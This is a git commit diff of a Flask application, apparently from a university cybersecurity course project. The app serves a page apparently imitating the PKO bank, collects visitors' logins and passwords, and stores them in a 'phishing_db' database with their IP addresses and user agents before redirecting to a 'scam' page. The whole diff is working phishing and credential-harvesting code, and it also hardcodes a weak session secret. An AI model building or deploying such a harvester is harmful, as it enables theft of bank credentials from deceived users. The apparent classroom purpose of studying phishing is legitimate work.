860644c053b28abd314d4cb4f4398bd76d472d1a
Dawid Garncarek <150728883+DawidGarncarek@users.noreply.github.com>
2025-03-20 14:39:42 +0100

    Add files via upload

--- Semestr 2/Cyberbezpieczeństwo/Projekt/app.py
+++ Semestr 2/Cyberbezpieczeństwo/Projekt/app.py
@@ -2,18 +2,21 @@ from flask import Flask, render_template, request, redirect, url_for, session
 import pyodbc
 
 app = Flask(__name__)
-app.secret_key = 'tajny_klucz'  # Potrzebny do przechowywania loginu w sesji
+app.secret_key = 'tajny_klucz'  
 
-# Konfiguracja MSSQL
 conn = pyodbc.connect(
     r'DRIVER={SQL Server};'
-    r'SERVER=DAWIDEK\SQLEXPRESS;'
+    r'SERVER=LAPTOKDAWIDKA\SQLEXPRESS;'
     r'DATABASE=phishing_db;'
     r'Trusted_Connection=yes;'
 )
 cursor = conn.cursor()
 
 @app.route('/')
+def home():
+    return render_template('pko.html')
+
+@app.route('/login')
 def index():
     return render_template('login.html')
 
@@ -21,7 +24,6 @@ def index():
 def login():
     login = request.form['login']
 
-    # Sprawdzenie, czy login już istnieje w bazie
     cursor.execute("SELECT id FROM users WHERE login = ?", (login,))
     user = cursor.fetchone()
 
@@ -32,7 +34,6 @@ def login():
         user_id = cursor.fetchone()[0]
         conn.commit()
 
-    # Zapisanie user_id w sesji, aby przekazać do /password
     session['user_id'] = user_id
 
     return redirect(url_for('password_page'))
@@ -40,7 +41,7 @@ def login():
 @app.route('/password')
 def password_page():
     if 'user_id' not in session:
-        return redirect(url_for('index'))  # Jeśli ktoś wejdzie na /password bez loginu
+        return redirect(url_for('index'))  
 
     return render_template('password.html')
 
@@ -52,20 +53,16 @@ def submit_password():
     password = request.form['password']
     user_id = session['user_id']
 
-    # Pobranie IP i User-Agent
     ip_address = request.remote_addr
     user_agent = request.headers.get('User-Agent')
 
-    # Zapisanie hasła
     cursor.execute("INSERT INTO passwords (user_id, password) VALUES (?, ?)", (user_id, password))
     conn.commit()
 
-    # Zapisanie logów
     cursor.execute("INSERT INTO logs (user_id, ip_address, user_agent) VALUES (?, ?, ?)", 
                    (user_id, ip_address, user_agent))
     conn.commit()
 
-    # Wyczyść sesję po zapisaniu danych
     session.pop('user_id', None)
 
     return redirect(url_for('scam'))
